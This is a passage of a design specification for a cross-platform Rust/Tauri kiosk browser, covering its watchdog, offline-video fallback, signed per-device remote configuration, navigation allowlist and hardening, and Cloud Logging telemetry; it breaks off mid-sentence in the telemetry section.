# Kiosk Browser — Design Specification

Date: 2026-07-05
Revised: 2026-07-06 (Revision 2 — adversarial design review)
Status: Approved 2026-07-06 — Revision 2 accepted with all §12 recommended defaults; owner may still override any §12 item before the affected phase starts
Owner: ptrkhh (github.com/ptrkhh)

> **Revision 2 note.** This revision incorporates a structured writer/critic/moderator
> debate (91 evidence-grounded objections across architecture, platform feasibility,
> config schema, telemetry, security, hardening, and roadmap/testing; 23 rated
> high-severity). Changes verified against vendor documentation and, where noted, live
> checks. Findings that are genuine product/scope decisions rather than technical
> corrections are collected in **§12 Open questions & owner decisions**; where §12 marks
> a "recommended default (applied)", the safe default is written into the body below and
> the owner may override it.

## 1. Overview

A cross-platform kiosk browser for Windows, Linux, and Android. Each device runs a
locked-down fullscreen WebView pointed at a configured URL, falls back to a looping
local video when offline, fetches per-device configuration from Google Cloud Storage,
pushes structured telemetry to Google Cloud Logging, and is supervised by a watchdog
that restarts it after crashes or hangs.

### Goals

- **One codebase, three platforms; identical app behaviour and telemetry across the
  fleet.** OS-level lockdown *enforcement* differs by platform — see §7, the §7.2
  hardening baseline, and §11; secure deployments require the mandated per-platform
  baseline. (Telemetry is genuinely identical: one schema, one pipeline.)
- Survive unattended 24/7 operation: crashes, hangs, network loss, bad config pushes.
- Zero-touch fleet visibility through Google Cloud Logging (no custom dashboard code).
- Field-serviceable: replaceable offline video, replaceable credential, bootstrap INI,
  secret exit gesture for technicians.

### Non-goals

- Fleet dashboard UI (use Cloud Logging / Cloud Monitoring; we ship queries and docs).
- CMS or content authoring (the content is a website we point at).
- iOS and macOS targets (Tauri would make macOS cheap later; explicitly out of scope).
- Peripheral integrations (receipt printers, scanners) — future work.
- MDM/EMM replacement (device enrollment, app distribution stay with existing tooling).

## 2. Decision record

### 2.1 Build vs. buy (2026-07-05)

Surveyed FOSS/commercial landscape: OpenKiosk (Win/Linux, Firefox-based, no Android,
no cloud telemetry), Porteus Kiosk (Linux-only OS), FreeKiosk (Android-only, remote
config still open), Fully Kiosk (Android-only, closed, ~€8/device), Xibo/Anthias
(signage players, not interactive kiosk browsers), Edge Assigned Access / Chromium
`--kiosk` / cage+Cog (building blocks only). No project covers the cross-cutting spec:
3 platforms + offline-video state machine + per-device GCS config + Google Cloud
Logging + unified watchdog telemetry. Decision: build (option A), reuse patterns from
FreeKiosk (Android Lock Task / watchdog service; verify license before copying code)
and Fully Kiosk (feature checklist).

### 2.2 Stack: Rust + Tauri 2

Chosen over .NET (Linux webview story weak: community CEF, ~150 MB), Flutter
(flutter_inappwebview has no Linux support), Electron+Kotlin (two codebases, ~200 MB,
bundled Chromium contradicts the WebView2 requirement), native-per-platform (3×
maintenance).

Tauri 2 gives: system webviews everywhere (WebView2 / WebKitGTK / Android System
WebView), Android build tooling (`cargo tauri android`), small binaries (~10 MB),
single Rust core shared by app and watchdog. Accepted risks: team Rust ramp-up; Tauri
mobile is the newest leg (mitigated by scheduling Android last).

**Feasibility caveats surfaced by review** (see §7, §11, §12): on Windows a
`WH_KEYBOARD_LL` hook is documented not to receive events while a Tauri/WebView2 window
is focused (Tauri #13919), so shortcut blocking cannot rely on it alone and must be
proven in a P0 spike with OS-level Assigned Access / Shell Launcher as the covering
boundary; Android WebView customization goes through the `with_webview` JNI escape hatch
(Tauri #5148); several hardening controls need per-engine configuration rather than one
identical path.

### 2.3 Deltas from the original request

1. `kiosk.mp4` / `kiosk-offline.mp4` naming inconsistency → unified as `kiosk-offline.mp4`.
2. Watchdog is the parent process and entry point (`kiosk-launcher` spawns
   `kiosk-main`), not a sidecar.
3. Android has no separate launcher binary (platform forbids the model). Lock Task
   Mode + foreground service + `BOOT_COMPLETED` receiver + in-process watchdog thread
   fill the role and emit the same watchdog log events. Crash-loop/safe-mode parity is
   implemented in-app (§3.2).
4. `.exe` suffix only on Windows.
5. Config bucket kept private; config fetched with an authenticated, **per-object
   read-scoped** credential (never bucket-wide `objectViewer` — see §8/SEC-04) instead of
   public-read. Public URLs still work. *(Interim = per-device or IAM-condition-scoped
   credential; production target = token-proxy — §8, §12/OD-2.)*
6. Service-account key scoped to `logging.logWriter` + a per-device, condition-scoped
   storage read (see §8); bucket-wide `objectViewer` is not used in production.
7. Added: secret exit gesture with PIN, and idle session reset — both implemented
   **natively** (§3.5) for privacy on shared kiosks. Both were absent from the original
   list; field operations require them.

## 3. Architecture

### 3.1 Process model — Windows & Linux

```
autostart (Startup shortcut / Scheduled Task / systemd unit)
        │
        ▼
kiosk-launcher            ── watchdog, no UI
        │  spawns + supervises
        │  heartbeat server (named pipe on Windows, unix socket on Linux)
        │  restart w/ exponential backoff; crash-loop → safe mode
        ▼
kiosk-main (Tauri 2)      ── fullscreen borderless always-on-top window
   ├─ app state machine  Boot → ConfigLoad → Online(url) ⇄ Offline(video) | Safe
   ├─ connectivity prober (drives Online ⇄ Offline)
   ├─ config manager      fetch → verify sig → validate → apply → persist last-good
   ├─ GCL logger          batch, disk spool, JWT auth   (independent thread)
   ├─ heartbeat client    ping every 5 s                (independent thread)
   └─ platform glue       cursor hide, key blocking, keep-awake, kiosk window
```

- Launcher restarts main on: process exit (any code except intentional-exit code 86),
  3 consecutive missed heartbeats (15 s) — subject to the liveness disambiguation below,
  so a live child with only a dropped channel is *not* restarted — and later memory-cap
  breach.
- **Startup grace / READY handshake (arch-03).** Heartbeat-timeout enforcement is
  *disarmed* until main sends an explicit `READY` frame over the heartbeat channel
  (emitted once the webview is initialized and the first navigation — bootstrap or
  content — has committed). Until `READY` the launcher waits up to `startup_grace_s`
  (default 90 s, from `kiosk.ini`); only then does the 3-missed-heartbeat rule arm. A
  `watchdog.arm` event logs the transition and time-to-ready. If grace expires with no
  `READY`, that counts as one failed start (feeding backoff/crash-loop), never an
  infinite kill-at-15 s loop. This prevents a slow cold boot (WebView2 first-run +
  remote-config fetch on slow IoT hardware) from being killed as a false hang.
- **Webview-hang liveness — phased (arch-04, RT-02; see §12/OD-1).** The process
  heartbeat proves main's process is alive but not that the renderer is responsive. In
  **P1 (Windows)** the responsiveness signal is native: `CoreWebView2.ProcessFailed` with
  `RenderProcessUnresponsive` fires when the renderer wedges (main's process stays alive),
  driving a reload → `watchdog.hang` → escalate to restart on repeat. The
  **cross-platform webview round-trip / JS-ping** liveness (main emits each 5 s heartbeat
  only after round-tripping a no-op through the webview — evaluate a trivial script, await
  its echo, 3 s cap; a wedged renderer withholds the heartbeat → 3-missed rule restarts
  main) lands in **P2** (WebKitGTK/Android, where no native unresponsive signal exists).
- **Liveness disambiguation (arch-15).** Missed heartbeats alone never trigger a
  restart. On the 3rd miss the launcher consults the child's real state (it is the
  launcher's own child): (a) child process exited → restart immediately with the real
  exit code; (b) child alive + channel I/O error (broken pipe/EOF/reset) → a *channel*
  fault: launcher re-accepts, main reconnects (bounded by `channel_grace_s`, default
  30 s), no restart, `watchdog.channel_reset` WARNING logged; (c) child alive + healthy
  channel + no round-trip ping → genuine hang → restart. Main's reconnect backoff is set
  below the timeout so a transient drop self-heals.
- **Backoff & crash-loop → safe mode (arch-12).** Backoff 1 s → 2 → 4 → … → 60 s
  between restarts. **Health reset:** backoff AND the restart counter clear once a main
  instance runs continuously ≥ `healthy_run_s` (default 120 s), so an occasional crash
  never ratchets. The restart counter is a **sliding** 10-minute window; > 5 restarts
  within any 10-minute window → launcher starts `kiosk-main --safe`. Entering safe mode
  clears the window. In safe mode the launcher retries normal mode every 10 minutes; a
  retry that again fails within `healthy_run_s` re-enters safe mode, a retry surviving
  `healthy_run_s` exits and resets counters. Devices that crash only occasionally (each
  run ≥ `healthy_run_s`) are intentionally *not* quarantined; their crash rate is
  visible via `watchdog.restart`/`crash.panic` volume in GCL.
- `kiosk-main --safe` = bundled error page showing device ID + last error, no remote
  load. **Safe-mode escalation (arch-14):** `--safe` renders through the same webview
  engine, so an engine-level fault (corrupt WebView2 after a bad evergreen update, GPU
  driver crash, WebKitGTK segfault) can crash it too. After N consecutive `--safe`
  starts that fail within `healthy_run_s` (default N=3), the launcher stops fast-looping,
  backs off to the 60 s ceiling, and emits a distinct `watchdog.safe_mode_failed`
  CRITICAL event so the blank-screen outage is bounded and visible in GCL rather than an
  invisible infinite loop. *(A launcher-owned native, non-webview last-resort window is
  an owner decision — §12/OD-9.)*
- Exit code 86 = intentional exit (technician PIN menu — native, §3.5); launcher exits
  too. The autostart integration must **exempt code 86** from auto-restart so a
  technician exit reaches the desktop: systemd `Restart=always` with
  `RestartPreventExitStatus=86` and `SuccessExitStatus=86`; Windows uses a boot/logon
  trigger with no restart-on-exit setting (the launcher owns crash-restart, not the OS
  task). Relaunch after a technician exit is explicit operator action (reboot /
  `systemctl start` / next logon), documented in the runbook (arch-05).
- Launcher logs watchdog events to GCL directly via the shared core client, so restart
  evidence survives main's death. **On restart the launcher takes ownership of main's
  orphaned spool** (rename to `spool.orphaned`, drain via the shared client) so main's
  pre-death context is delivered even though main is dead (TEL-10).
- **Keyboard-hook threading (M2, PF-01).** Where an in-app hook is used, it runs on a
  dedicated high-priority thread with its own message pump, isolated from the webview UI
  thread, so a UI-thread hang does not stall the hook (Windows drops a low-level hook
  whose pump exceeds `LowLevelHooksTimeout`). Swallowing is not gated solely on focus;
  focus loss is a hardening event (`focus.lost`) answered by reasserting top-most +
  foreground. The in-app hook is defense-in-depth only — see §7 and §12/OD-5.

### 3.2 Process model — Android

`kiosk-main` core compiles into the Tauri Android app. A small Kotlin layer (Tauri
plugin) provides: **Lock Task Mode, which requires device-owner provisioning** (§12/OD-4);
if the app is not device owner it **fails closed** — renders a full-screen
"provisioning required" page and emits `watchdog.safe_mode` (reason `not-device-owner`)
instead of running unprotected. Screen pinning is **not** a security fallback — exiting
it needs only touch-and-hold Back+Overview (support.google.com/android/answer/9455138) —
and is offered only behind the explicit `demo_mode` flag in `kiosk.ini` (local-only,
never remotely settable — §5.1; additionally requires a device screen-lock credential),
documented as non-secure / demo-only.

The plugin also provides: foreground service with `START_STICKY`, declaring an
appropriate `foregroundServiceType` (`specialUse` for the kiosk, or `systemExempted`
where device-owner permits — **mandatory on API 34+**, PF-08); `BOOT_COMPLETED`
receiver; `FLAG_KEEP_SCREEN_ON`; and `WebSettings.setMediaPlaybackRequiresUserGesture(false)`
(required for offline-video autoplay — Android WebView's default of `true` blocks kiosk
autoplay, arch-10). Native WebView controls (`setSupportZoom(false)`, long-press consume)
are reached via Tauri `with_webview` JNI on the wry WebView handle (Tauri #5148); most
Android hardening is enforced primarily in injected JS/CSS which needs no native access
(§7, PF-06).

**Reliable boot-autostart** of the foreground service from `BOOT_COMPLETED` requires
device-owner on Android 14+ (device/profile owners are exempt from the
background-FGS-start restriction; the screen-pinning fallback is not), so the fallback
is best-effort and may need a user tap to re-enter the kiosk after reboot (PF-08).

An in-process watchdog thread monitors webview responsiveness (webview round-trip, §3.1).
OS service-restart semantics replace the launcher, but **crash-loop protection is
implemented in-app to match launcher semantics** (the OS provides neither a persistent
restart count nor backoff): on every start the app appends a start timestamp to
restart-history in the app files dir and runs the same crash-loop check as the launcher
(sliding 10-min window + `healthy_run_s` reset, §3.1). On trip it (a) enters an in-process
Safe state rendering the bundled safe page (the `--safe` equivalent) and (b) emits
`watchdog.safe_mode`, applying the same backoff. This yields identical `watchdog.*`
telemetry across all three platforms (arch-06). Min SDK: API 26.

### 3.3 State machine

```
Boot ──▶ ConfigLoad ──▶ Online(url) ◀──▶ Offline(video)
              │              │
              │              └── nav/site error, fallback=error_page ──▶ ErrorPage(retry countdown)
              └── no cached config + no network ──▶ Offline(video), keep trying
Safe (entered only via kiosk-main --safe, or in-app Safe on Android)

ErrorPage(retry countdown)
   ├─ countdown expiry, retry OK ──▶ Online(url)
   ├─ countdown expiry, retry fails ──▶ ErrorPage (re-arm, attempts++)
   ├─ attempts ≥ error_max_retries ──▶ Offline(video)
   └─ prober flips offline ──▶ Offline(video)
```

- Connectivity prober: HTTP GET to `connectivity_check_url` (default
  `https://www.gstatic.com/generate_204`), every 10 s while offline, 30 s while
  online. Two consecutive successes flip online; two failures flip offline (damping —
  no flapping between video and site). Captive portals fail the 204 check correctly.
- **Reachability scope (arch-13).** `connectivity_check_url` MUST sit on the same
  network path as `content.url` — the prober measures reachability of *that* URL, not
  general internet access. On intranet/air-gapped deployments the public default reads
  permanently-offline while the content host is up; set `connectivity_check_url` to a
  lightweight endpoint on the content origin. If unset and `content.url` is non-public
  (private host/IP heuristic), the prober falls back to probing `content.url`'s origin.
- **Config fetch timeout (cfg-10).** The config fetch uses explicit reqwest timeouts
  (connect 5 s, total 10 s; reqwest has no short default). A `ConfigLoad` that does not
  complete within the timeout is treated as a failed fetch and follows the no-network
  path: boot on `config-lastgood.json` if present, else the bootstrap URL, else
  `Offline(video)`, retry next poll. The reconnect-triggered refetch runs off the UI
  path and is bounded by the same timeout so it can never block the visible webview.
- `fallback` config selects behavior when the internet is up but the site fails:
  `video` (default) or `error_page` (bundled, auto-retry countdown). ErrorPage retries
  `content.url` on each countdown expiry; consecutive failures re-arm with a bounded
  counter; after `error_max_retries` (default 5) it falls to `Offline(video)` and keeps
  probing; a prober-offline flip transitions to `Offline(video)` immediately (arch-07).
- Reconnect triggers immediate config refetch, then navigation back to the site.

### 3.4 Offline video

Rendered in the same webview: bundled `offline.html` with
`<video loop autoplay muted playsinline>` pointing at the local `kiosk-offline.mp4` via
the Tauri asset protocol. **One HTML rendering path on all platforms (no native media
decoding/UI); each engine's autoplay policy is satisfied via its own configuration:**
WebView2/Chromium and WebKitGTK permit muted autoplay; Android System WebView
additionally requires the plugin to set `WebSettings.setMediaPlaybackRequiresUserGesture(false)`
(its default `true` blocks kiosk autoplay — arch-10). This one WebSettings call is the
only per-engine media configuration.

The file sits next to the binaries and is user-replaceable; absence → bundled static
"offline" splash. **Decode-failure robustness (arch-09):** `offline.html` wires the
`<video>` element's `error`/`stalled`/`emptied` events and the `play()` promise
rejection to fall back to the static splash and emit a `media.error` log; a watchdog
timer also asserts playback progresses (`currentTime` advances within 3 s of load).
This covers a corrupt/incompatible codec or a missing platform decoder, not just a
missing file.

H.264 baseline recommended. The Linux `.deb` declares the exact GStreamer decode chain:
`gstreamer1.0-plugins-base`, `gstreamer1.0-plugins-good` (qtdemux),
`gstreamer1.0-plugins-bad` (h264parse), `gstreamer1.0-libav` (avdec_h264); a missing
element yields a silent black video, so packaging CI smoke-tests the offline path on the
pinned Debian 12 image, and §10 adds a multi-hour loop soak (WebKitGTK's seek/resume
path is historically fragile — Debian #1062012; PF-05). If the seek-loop stutters, the
conditional fallback is a seamless double-buffered (no seek-to-0) `<video>` loop or a
native GL video path (the latter forfeits the "no native media code" property).

### 3.5 Idle reset & exit gesture (native)

**Idle-session reset and the technician exit gesture are detected and executed entirely
in native code; no page-world JavaScript is trusted to drive them (SEC-02, SEC-06).**
The prior `kiosk://` navigation-sentinel bridge is **removed** — a `window.location`
assignment is an ordinary navigation performable by *any* script in the page's world
(the allowlisted site's own code, a third-party ad/analytics script, stored XSS), and
Tauri injects scripts into the page's main world across all three engines
(docs.rs `WebviewWindowBuilder::initialization_script`), so a page-readable nonce cannot
protect it. Making these actions native removes an entire remote-reachable attack surface.

- **Idle reset:** native input-idle timer (platform last-input timestamp). On timeout
  native code navigates home and, if `clear_data_on_reset`, clears the **full profile**
  — cookies, web storage, IndexedDB, **and the autofill/Web-Data and Login-Data stores**
  (M5) — via the native webview data API (WebView2 `Profile.ClearBrowsingDataAsync`,
  WebKitGTK `WebsiteDataManager.clear`, Android `CookieManager`/`WebStorage`/
  `WebViewDatabase.clearFormData`). Because some clears are asynchronous, the state
  machine gates re-display until the clear completes.
- **Exit gesture:** the native window counts taps in `exit_gesture.region` from OS-level
  pointer/touch events (same input layer as the keyboard hook) and opens the app-origin
  PIN pad only after `taps` genuine taps; no page JS is involved. Correct PIN → exit
  code 86. **Reliability caveat:** native pointer/touch capture over a *focused* WebView2
  window must be proven in the P0 spike (Tauri #13919 blinds the keyboard hook when the
  WebView2 window is focused; the pointer path may be similarly affected). If native tap
  capture proves unreliable, the exit gesture falls back to a reserved
  `AcceleratorKeyPressed` technician chord and/or the §7.2 OS-lockdown escape, so a locked
  device is never unexitable.

Any `kiosk://` navigation originating from a remote origin is treated as `nav.blocked`
(§3.6). Bundled app-origin pages (PIN pad, safe mode) continue to use full Tauri IPC.

### 3.6 Navigation guard

The allowlist matcher is a **pure `kiosk-core` function** (parses the URL and matches on
scheme+host+path; default-deny on parse failure) so it is host-testable with adversarial
tests (RT-03); `webview.rs` only wires the platform navigation-intercept to it.

- `content.allowlist` governs **top-level (main-frame) navigations only** (WebView2
  `NavigationStarting.IsMainFrame`; WebKitGTK main-frame `decide-policy`; Android
  `WebResourceRequest.isForMainFrame`). Sub-frame/sub-resource loads (payment iframes,
  maps, SSO) are permitted as the loaded app chooses — the adversary in this threat
  model is the user, not the trusted allowlisted origin. A sub-frame `target=_top` link
  produces a top-level navigation and IS re-checked. Deployments that distrust embed
  origins may set an optional `content.frame_allowlist` (default unset = allow) (M6).
- Allowlist patterns use **URLPattern semantics** (Rust `urlpattern` crate); the raw
  `globset` alternative is not URL-aware and is the source of `?`/`/`/`#` matching
  ambiguities. The effective home URL (`content.url` after `{device_id}` templating) is
  **always implicitly allowed** so the initial navigation can never be self-blocked
  (logged); allowlist governs only subsequent navigations (cfg-02; §12/OD-6). Unit tests
  cover patterns crossing `?`, `#`, `/`.
- **Pre-config bootstrap window (arch-08):** when `content.allowlist` is absent/empty the
  effective allowlist is the origin (scheme+host, all paths) of the currently active
  target URL — the `[bootstrap]` url before config, `content.url` after. This guarantees
  the bootstrap navigation is permitted on first/offline boot and that an empty `{}`
  config stays origin-locked rather than open.
- **External URI schemes (H2):** `mailto:`, `tel:`, `ms-settings:`, `ms-store:`, and any
  OS-registered custom scheme are NOT ordinary navigations and are not stopped by
  cancelling `NavigationStarting`. WebView2 — subscribe `LaunchingExternalUriScheme`,
  `args.Cancel = true` unless the scheme is in `content.scheme_allowlist` (default empty).
  WebKitGTK — `decide-policy` blocks any non-http(s)/non-`kiosk://` scheme and never
  calls `gtk_show_uri`. Android — `shouldOverrideUrlLoading` returns true for any
  non-allowlisted scheme and never starts an Intent. Blocked launches log `nav.blocked`
  with the scheme.
- **Script dialogs (M3):** WebView2 `AreDefaultScriptDialogsEnabled=false` + handle
  `ScriptDialogOpening` (auto-dismiss `beforeunload`, never surface it on a blocked
  navigation; rate-limit `alert`/`confirm`/`prompt` to defeat modal-spam DoS). WebKitGTK
  `script-dialog` returns TRUE with the same policy; Android `WebChromeClient` consumes
  `onJs*`. Leniency is keyed to app-origin vs remote-origin.
- `kiosk://` navigations from a remote origin are logged and blocked. New-window requests
  open in the same webview. Downloads blocked; PDF policy per §7. Violations logged
  (`nav.blocked`); egress containment (subresource host-allowlist + CSP) is a *separate*
  boundary — see §7 "Egress containment" (the navigation allowlist is not an
  exfiltration boundary, SEC-10).

## 4. Project structure

```
kiosk-browser/                      # Cargo workspace
├── Cargo.toml
├── crates/
│   ├── kiosk-core/                 # platform-agnostic, fully unit-tested
│   │   └── src/
│   │       ├── config/             # INI bootstrap, remote JSON, signature verify, validation, last-good
│   │       ├── logging/            # GCL REST client, JWT signing, batcher, tiered disk spool, trusted time
│   │       ├── net/                # connectivity prober state machine
│   │       ├── nav/                # URL allowlist + glob matcher (pure; scheme+host+path; default-deny)
│   │       ├── metrics/            # health sampling (sysinfo)
│   │       ├── ipc/                # heartbeat protocol (shared by main + launcher)
│   │       └── identity.rs         # device id: machine GUID / machine-id / Android ID
│   ├── kiosk-main/                 # Tauri 2 app — desktop + android targets
│   │   ├── src/
│   │   │   ├── state.rs            # app state machine
│   │   │   ├── webview.rs          # hardening settings, injection, navigation-intercept wiring
│   │   │   └── platform/           # windows.rs, linux.rs, android.rs
│   │   ├── assets/                 # offline.html, error.html, splash.html, pinpad.html
│   │   └── gen/android/            # Tauri Android scaffold + Kotlin kiosk plugin
│   └── kiosk-launcher/             # watchdog binary (Windows/Linux only)
├── packaging/
│   ├── windows/                    # WiX MSI (+ credential ACL via util:PermissionEx, Authenticode signing), autostart, WebView2 evergreen bootstrap
│   ├── linux/                      # .deb, systemd units, cage (Wayland kiosk) session docs
│   └── android/                    # provisioning docs, device-owner QR
├── dist-template/                  # kiosk.ini, kiosk-offline.mp4, kiosk-credential.json, kiosk-config.example.json placeholders
└── docs/
```

Layering rule: `kiosk-core` has no Tauri or platform dependencies and is fully
testable on any host. `kiosk-main/platform/` contains the only per-OS code. The
navigation allowlist matcher lives in `kiosk-core/nav/`, not the thin webview layer.

### File & directory conventions

| Item | Windows | Linux | Android |
|---|---|---|---|
| Install dir (read-only) | `C:\Program Files\kiosk\` | `/opt/kiosk/` | APK |
| `kiosk.ini`, credential, mp4 | next to binaries (override: `--config <path>`) | same | app files dir |
| Data dir (cache, spool, last-good) | `%ProgramData%\kiosk\` | `/var/lib/kiosk/` | app files dir |

**Spool is partitioned by writer (arch-01):** `<data>/spool/main/` and
`<data>/spool/launcher/`. Every segment has exactly one writer AND one drainer (the
owning process), so no cross-process append/rotate/drain lock is required; GCL ordering
across the two streams is by each entry's UTC timestamp + `insertId`, not file order. A
crashed main's `spool/main/` is drained by the next main (or `--safe`), and the launcher
scoops it on restart (§3.1, TEL-10).

The credential must have a restrictive owner-only ACL/mode; the default
`C:\Program Files\kiosk\` is world-readable, so the installer MUST tighten it (WiX
`util:PermissionEx` on Windows; `root:root 0600` or the keyring on Linux) — see §8/SEC-09.

## 5. Configuration

### 5.1 `kiosk.ini` — local bootstrap (per-device, written at install time)

```ini
[kiosk]
config_url    = https://storage.googleapis.com/kiosk/devices/lobby-01.json
device_id     =                       ; empty → auto (machine GUID / machine-id / Android ID)
site          = jakarta-hq
region        =                       ; optional; feeds generic_node.location (§6). empty → site
project_id    = my-gcp-project
credential    = kiosk-credential.json
startup_grace_s = 90                  ; launcher: max wait for main READY before arming heartbeat (§3.1)
healthy_run_s   = 120                 ; min continuous uptime that clears backoff + crash-loop counter (§3.1/§3.2)
channel_grace_s = 30                  ; launcher: heartbeat-channel reconnect grace before restart (§3.1)
demo_mode       = false               ; Android only: allow insecure screen-pinning fallback when not device-owner (§3.2). Local-only — never a remote/bucket field

[bootstrap]
url = https://app.example.com/kiosk   ; used as home URL until/unless remote config supplies content.url

[exit_gesture]                        ; bootstrap exit gesture, used before first remote fetch (cfg-12)
pin_hash = $argon2id$v=19$m=65536,t=3,p=4$...   ; PHC string; if absent here and remote, exit gesture is DISABLED
taps     = 7
region   = top-left
```

### 5.2 Remote config — JSON v1

Fetched with the GCS object **generation** as the authoritative change-detector
(persist it alongside the cached config; `If-None-Match`/ETag → 304 may remain as a
transport-level no-op optimization, but generation is the source of truth — GCS documents
generation/metageneration as consistent across APIs while ETags are not; cfg-14).

**Validation is whole-document and atomic (cfg-11; SEC-11).** A remotely-fetched config
is validated in strict order: **(1) signature** — reject if `sig` is missing or does not
verify against the pinned public key (§8/SEC-11); **(2) device binding** — reject if
`device_id` (inside the signed payload) is missing or ≠ this device's **effective**
device_id; **(3) anti-rollback** — reject if `revision` is missing or ≤ the persisted
last-applied revision; **(4) schema & ranges** — unknown fields **warn**, any
invalid/out-of-range value **rejects the entire fetched config** (never applies
partially). Any rejection keeps last-good. `sig`, `device_id` and `revision` are
therefore **required on every fetched config**. Device binding sits immediately after the
signature because it is an *authenticity* concern, not a schema one: an unverified
document's `device_id` must never be trusted, and a verified one that names another
device must not reach the rollback or schema gates at all. Locally-sourced config is
exempt from steps (1)–(3): the `[bootstrap]` url has no remote body. `config-lastgood.json`
is NOT exempt — at boot it must re-clear (1) and (2) (a disk file cannot prove its own
provenance; §8/SEC-11), and its stored revision is retained as the in-memory anti-rollback
floor whether or not its content is adopted. The `config.error` payload names every
offending field with a per-field reason and value, e.g.
`{ errors: [{field, reason, value}], rejected_revision }`; a device-binding rejection is
reported distinctly from a signature or rollback rejection, so an operator can tell that a
config **for another device** was served.

Applied config is persisted as **exactly one** valid artifact, `config-lastgood.json` =
the most recent successfully-applied (hence valid) remote config (cfg-06). BOOT: apply
`config-lastgood.json` if present (used directly when the network is down), else
bootstrap. REFETCH: on a valid fetch, apply and overwrite; on invalid, `config.error` +
keep current. There is no separate "cache" config artifact.

`{device_id}` templating in `content.url` expands to the **effective** device_id
(`[kiosk] device_id` if non-empty, else the auto-resolved machine id) — the same value
used as the Cloud Logging `device_id` label, so URL identity and log identity are
identical by construction; a warning fires at apply if `{device_id}` is used while it
resolves to an opaque GUID (cfg-09).

```jsonc
{
  "version": 1,                           // schema MAJOR version; optional (omitted ⇒ 1)
  "revision": 42,                         // REQUIRED on fetched config; monotonic integer inside the signed payload; device rejects ≤ last-applied
  "device_id": "lobby-01",                // REQUIRED on fetched config; inside the signed payload; MUST equal the device's effective device_id (the same value used as the Cloud Logging `device_id` label). Mismatch or absent ⇒ the WHOLE document is rejected (§8/SEC-11)
  "sig": "ed25519:...",                   // REQUIRED; detached sig over RFC 8785 JCS canonical form of this object with `sig` removed; pinned key (§8)
  "content": {
    "url": "https://app.example.com/kiosk?device={device_id}",  // default = [bootstrap] url if omitted (cfg-05)
    "allowlist": ["https://app.example.com/*"],   // URLPattern; empty ⇒ origin of active URL (arch-08)
    "frame_allowlist": null,              // optional; constrain sub-frame/sub-resource origins (M6)
    "scheme_allowlist": [],               // external URI schemes permitted to launch (H2); default none
    "fallback": "video",                  // video | error_page
    "error_max_retries": 5,               // ErrorPage attempts before falling to Offline(video) (arch-07)
    "zoom": 1.0,                          // [0.5, 3.0]
    "inject_css": "",                     // REJECTED unless config carries a valid signature (SEC-01)
    "inject_js": "",                      // REJECTED unless config carries a valid signature (SEC-01)
    "idle_reset_seconds": 180,            // 0 = off; returns to home URL (native, §3.5)
    "clear_data_on_reset": true,          // clears full profile incl. autofill on idle reset (M5)
    "pdf_view": false,                    // false ⇒ block application/pdf; true ⇒ bundled chrome-less pdf.js (M4)
    "permissions": {                      // web-permission policy, default-deny (M9)
      "camera": false, "microphone": false, "geolocation": false,
      "notifications": false, "clipboard_read": false
    }
  },
  "display": {
    "cursor_autohide_seconds": 5,         // [0, 3600]
    "monitor": 0,                         // ≥0; index beyond available displays ⇒ fall back to primary + WARNING
    "keep_awake": true
  },
  "input": {
    "touch_keyboard": "auto",             // auto | on | off
    "allow_context_menu": false,
    "allow_text_selection": false,        // inputs remain selectable
    "exit_gesture": {                     // per-device; pin_hash never fleet-readable (SEC-04/05)
      "taps": 7,                          // [3, 10]
      "region": "top-left",               // top-left | top-right | bottom-left | bottom-right | center
      "min_len": 4, "alphanumeric": false,
      "pin_hash": "$argon2id$v=19$m=65536,t=3,p=4$..."   // PHC string (cfg-04)
    }
  },
  "network": {
    "connectivity_check_url": "https://www.gstatic.com/generate_204",  // same network path as content.url (arch-13)
    "probe_online_s": 30,                 // [5, 3600]
    "probe_offline_s": 10,                // [5, 3600]
    "config_poll_s": 300                  // [30, 3600]; 0 is INVALID (cannot disable the only remote lever, cfg-01)
  },
  "maintenance": {
    "nightly_reload": "04:00",            // local wall-clock; null = off. Fires once/calendar day (DST-safe, cfg-15)
    "restart_app": null,                  // "04:30" = daily full restart
    "timezone": null,                     // optional IANA name; null = system local (cfg-15)
    "max_webview_mem_mb": 1500            // 0 = off; {0} ∪ [256, 8192] (P2)
  },
  "logging": {
    "level": "info",
    "health_sample_s": 60,                // [10, 3600]
    "spool_max_mb": 50,                   // [5, 1024]; 0 rejected (would drop all telemetry)
    "spool_reserve_high_mb": 10,          // protected WARNING+ ring; must be ≤ spool_max_mb (clamped if not) (TEL-07)
    "url_detail": "path"                  // path | host | full — URL redaction level (TEL-08)
  }
}
```

Every *content* field has a default, so a **signed** config whose body is `{}` is
schema-valid — all fields default and `content.url` falls back to the `[bootstrap]` url.
(A bare *unsigned* `{}` is rejected at validation step 1: `sig` and `revision` are
required on every fetched config.) **Numeric fields are range-checked**
(reject out-of-range, whole-document — cfg-07; ranges shown inline above; `display.monitor`
out-of-range falls back to primary with a WARNING rather than rejecting, since display
topology is device-local). **Effective values are additionally clamped at runtime** so a
legacy last-good config can never disable polling (cfg-01).

**Versioning & migration (cfg-03).** `version` is the schema MAJOR version (optional,
defaults to 1). A device supporting major *M* accepts `version == M`; `version > M` is
rejected with `config.error` reason `unsupported_version` and the device keeps last-good;
within a major all changes are additive-only (new fields optional with defaults). A v2
rollout to a mixed fleet leaves not-yet-upgraded v1 devices safely on last-good.

**Build capability set (RT-08).** Each build declares which config-driven features it
implements. On apply, any field set to a non-default value whose feature is not in the
running build's capability set produces a `config.warn` (and a `warnings[]` entry on
`config.applied`): "field *x* accepted but feature unavailable in this build (introduced
`<phase>`)" — turning not-yet-implemented knobs from silent no-ops into telemetry.

**Post-apply self-check (RT-04; §12/OD-6).** When an applied config changes `content.url`,
the device navigates and, if the load fails definitively (DNS/TLS/HTTP 4xx-5xx) *while*
`connectivity_check_url` still succeeds, it reverts to `config-lastgood.json`, logs
`config.reverted{revision, reason}`, and will not re-apply that revision until its
revision changes. If `connectivity_check_url` also fails (device offline) there is no
revert. This bounds a bad-but-valid URL push; a valid-and-reachable-but-wrong site is
caught only by human/canary practice (docs).

**JSON strictness (cfg-13).** The on-device parser is strict JSON (`serde_json`); comments
are not accepted. The `jsonc` block above is annotated documentation; ship a comment-free
`dist-template/kiosk-config.example.json` for operators to copy.

## 6. Telemetry — Google Cloud Logging

- Auth: service-account JSON → RS256 JWT → OAuth2 token → `entries:write` REST.
  Crates: `jsonwebtoken`, `reqwest` (rustls). No GCP SDK dependency.
- **Token lifecycle (TEL-05).** The access token (Google default TTL 3600 s) is minted
  once and cached in memory only (never spooled — it is a bearer secret), refreshed
  proactively at `exp − 5 min`. An `entries:write` 401 forces one immediate
